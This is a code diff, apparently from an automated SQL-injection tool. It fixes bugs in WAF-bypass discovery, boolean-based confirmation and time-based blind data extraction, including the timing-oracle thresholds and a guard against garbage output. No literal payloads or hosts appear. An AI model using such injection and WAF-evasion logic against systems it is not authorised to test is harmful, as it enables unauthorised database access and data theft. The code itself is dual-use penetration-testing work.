@@ -131381,7 +131381,7 @@ class TechniqueCascadeEngine:
                         _ctx_bconf = 3  # mark as passed so we fall through to DetectionResult
                     else:
                         # Stable page or marginal gap: require 3/6 consecutive confirmations.
-                        _ctx_bconf = 1
+                        _ctx_bconf = 0
                         for _ctx_mp in range(5):
                             if _SCAN_STOPPED[0]: break  # BUG-FIX-REQ4-SLEEP
                             await asyncio.sleep(1.0)
@@ -131390,10 +131390,11 @@ class TechniqueCascadeEngine:
                             _ctx_mpf = await _send_injected(self.engine, method, url, data,
                                 data_fmt, param, original + false_sfx, self.tamper_chain)
                             self._total_reqs += 2
-                            # BUG-FP-4-FIX: WAF-blocked probe produces synthetic delta; skip iteration
-                        if WAFBlockDiscriminator.is_waf_block(_ctx_mpt) or WAFBlockDiscriminator.is_waf_block(_ctx_mpf):
-                            continue
-                        _ctx_st = SimHasher.body_similarity(norm_b, ResponseNormaliser.normalise(_extract_body_safe(_ctx_mpt)) if _validate_response(_ctx_mpt, allow_empty=True) else b"")
+                            # CTX-BOOL-WAFGUARD-FIX: WAF-blocked probe produces synthetic delta; skip iteration.
+                            # Guard must be INSIDE the loop, BEFORE SimHasher, so continue targets the for-loop.
+                            if WAFBlockDiscriminator.is_waf_block(_ctx_mpt) or WAFBlockDiscriminator.is_waf_block(_ctx_mpf):
+                                continue
+                            _ctx_st = SimHasher.body_similarity(norm_b, ResponseNormaliser.normalise(_extract_body_safe(_ctx_mpt)) if _validate_response(_ctx_mpt, allow_empty=True) else b"")
                             _ctx_sf = SimHasher.body_similarity(norm_b, ResponseNormaliser.normalise(_extract_body_safe(_ctx_mpf)) if _validate_response(_ctx_mpf, allow_empty=True) else b"")
                             _ctx_gap = _ctx_st - _ctx_sf
                             if abs(_ctx_gap) > bool_thresh: _ctx_bconf += 1  # FIX: abs() for reversed-polarity
@@ -154334,13 +154335,15 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                     LOG.info("[TBExtract] EBF re-calibrated from cached bypass: thresh=%.0fms "
                              "(base=%.0fms sleep=%.1fs nofunc=%s)",
                              timing_thresh, _base_time, t, _ebf_nofunc_ref[0])
-                    _ebf_result = True  # Signal EBF-mode extraction to proceed
+                    _ebf_result = True  # Signal EBF-mode extraction to proceed (cache hit — EBF already ran)
                 else:
                     print(f"[!] [TBExtract] Static strategies blocked ({_ms_summary}ms) "
                           "running ExtractionBypassFinder (~50-150 probes)...", flush=True)
-                # EBF is only needed if not already cached
-                _ebf_result = None  # reset for conditional block below
-                if not (_ebf_mode[0] and _ebf_payload_fn_ref[0] is not None):
+                    _ebf_result = None  # Not yet cached — EBF must run
+                # EBF-CACHE-FIX: Only run EBF when bypass not already found (cache miss path, _ebf_result is None).
+                # The old code unconditionally overwrote _ebf_result=True with _ebf_result=None here,
+                # making the cache-hit branch dead and causing EBF to always re-run even on a cache hit.
+                if _ebf_result is None and not (_ebf_mode[0] and _ebf_payload_fn_ref[0] is not None):
                     # BUG-EBF-RERUN-ON-FAILURE FIX: check for "blocked" sentinel before running.
                     # When EBF previously exhausted all candidates (returned None), we cached
                     # "blocked" in _TB_EBF_CACHE. Re-running EBF is unproductive — the WAF will
@@ -155245,7 +155248,14 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                 # Normal server jitter can reach 460ms, causing false True even without sleep.
                 # Add a sleep-relative floor: at least 30% of t must be visible above ref.
                 _ext_diff_t = max(_ext_ref * 2.5, _ext_ref + 400, _base_time + t * 1000 * 0.3)
-                _is_true = fp.elapsed_ms >= timing_thresh or fp.elapsed_ms >= _ext_diff_t
+                # EBF-ORACLE-FIX: When EBF bypass is active, timing_thresh was calibrated
+                # against the actual false-condition response time of the bypass template.
+                # Do NOT apply the _ext_diff_t heuristic in EBF mode — it was designed for
+                # non-EBF scenarios where timing_thresh might be miscalibrated, and in EBF
+                # mode it causes false-True detection when false-condition EBF responses
+                # legitimately fall between _ext_diff_t and timing_thresh (e.g., base=200ms,
+                # t=3s → _ext_diff_t=1100ms, but EBF false=1335ms → always-True → garbage).
+                _is_true = fp.elapsed_ms >= timing_thresh if _ebf_mode[0] else (fp.elapsed_ms >= timing_thresh or fp.elapsed_ms >= _ext_diff_t)
                 if pos == 1:
                     LOG.debug(f"[TBExtract] pos=1 elapsed={fp.elapsed_ms:.0f}ms "
                               f"thresh={timing_thresh:.0f}ms diff={_ext_diff_t:.0f}ms is_true={_is_true}")
@@ -155378,7 +155388,15 @@ async def _time_based_extract_inner(engine, config, result, sql: str,
                              if ord(c) < 0x20 or ord(c) == 0x7f or ord(c) > 0x7e)
             _noise_threshold = 0.10
         else:
-            _non_print = sum(1 for c in result_str if ord(c) < 0x20 or ord(c) == 0x7f or ord(c) > 0xFFFF)
+            # GARBAGE-GUARD-BMP-FIX (HIGH): The old check `ord(c) > 0xFFFF` only flags
+            # supplementary-plane characters (U+10000+). An always-True timing oracle on
+            # Oracle/MSSQL/PostgreSQL causes binary search to converge to BMP values like
+            # U+FFFE (the highest 2-byte codepoint), which pass the > 0xFFFF test → noise_ratio
+            # stays 0 → garbage guard never fires → garbled BMP string returned as valid data.
+            # Fix: use the same printable-ASCII lower bound as the MySQL branch (ord(c) > 0x7e),
+            # but keep the 40% threshold to allow extended Latin in legitimate non-ASCII data.
+            # This catches always-True oracle garbage for all non-MySQL DBMSes.
+            _non_print = sum(1 for c in result_str if ord(c) < 0x20 or ord(c) == 0x7f or ord(c) > 0x7e)
             _noise_threshold = 0.40
         _noise_ratio = _non_print / len(result_str)
         if _noise_ratio > _noise_threshold:
